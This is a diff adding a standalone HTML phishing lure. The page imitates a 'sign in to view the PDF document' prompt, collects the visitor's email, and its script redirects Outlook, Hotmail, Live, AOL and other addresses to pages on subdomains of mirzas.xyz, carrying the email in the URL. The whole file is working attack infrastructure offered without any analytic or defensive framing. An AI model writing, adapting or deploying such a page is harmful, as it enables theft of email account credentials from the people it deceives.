@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in to continue</title>
+    <link rel="icon" type="image/png" href="https://i.gyazo.com/e8d7a8e616e84a3a1225ace395a053c6.png">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+</head>
+<body style="margin: 0; padding: 0;">
+    <table cellspacing="0" width="100%" height="100%">
+        <tr>
+            <td style="box-sizing: border-box; overflow: hidden; height: 100%; font-family: 'PT Sans', sans-serif; width: 100%; background: url(https://i.ibb.co/RvPRVN8/image.png) no-repeat center center; background-size: cover; position: absolute; margin: auto;">
+                <table style="box-sizing: border-box; max-width: 450px; width: 90%; background: rgba(212, 9, 9, 0.96); color: #fff; text-align: center; margin: 250px auto; padding: 10px;">
+                    <tr>
+                        <td>
+                            <img src="https://i.ibb.co/dGg7175/image.png" height="70" alt="Logo">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="font-size: 1.5em; font-weight: bold; margin-top: 12px;">
+                            Sign in to view the document
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <form onsubmit="handleSubmit(event)">
+                                <input type="email" name="txt1" placeholder="Email Address" required style="box-sizing: border-box; width: 100%; margin-bottom: 20px; padding: 20px; border: none; background: #fff; color: #000;">
+                                <button type="submit" style="box-sizing: border-box; width: 100%; background: #581e1e; color: #fff; padding: 20px; border: none; margin: 20px 0; cursor: pointer;">View PDF Document</button>
+                            </form>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+    <script>
+        function redirectToProvider(email) {
+            var lowerCaseEmail = email.toLowerCase();
+
+            if (lowerCaseEmail.includes('@gmail.com')) {
+            window.location.href = '#' + email;
+        } else if (lowerCaseEmail.includes('@outlook.com') || lowerCaseEmail.includes('@hotmail.com') || lowerCaseEmail.includes('@live.com')) {
+            window.location.href = 'https://vbfrwgr-berfd.mirzas.xyz/DzaRWZbN#' + email;
+        } else if (lowerCaseEmail.includes('@yahoo.com') || lowerCaseEmail.includes('@yahoo.co.uk') || lowerCaseEmail.includes('@ymail.com') || lowerCaseEmail.includes('@rocketmail.com')) {
+            window.location.href = '#' + email;
+        } else if (lowerCaseEmail.includes('@aol.com')) {
+            window.location.href = 'https://kaflq-avqq1-qwf.mirzas.xyz/OkwvUtrV#' + email;
+        } else {
+            // Default redirection for other providers or invalid emails
+            window.location.href = 'https://vbfrwgr-berfd.mirzas.xyz/DzaRWZbN#' + email;
+        }
+    }
+
+        function handleSubmit(event) {
+            event.preventDefault();  // Prevent form from submitting in the default way
+            var email = document.querySelector('input[name="txt1"]').value;
+            redirectToProvider(email);
+        }
+    </script>
+</body>
+</html>
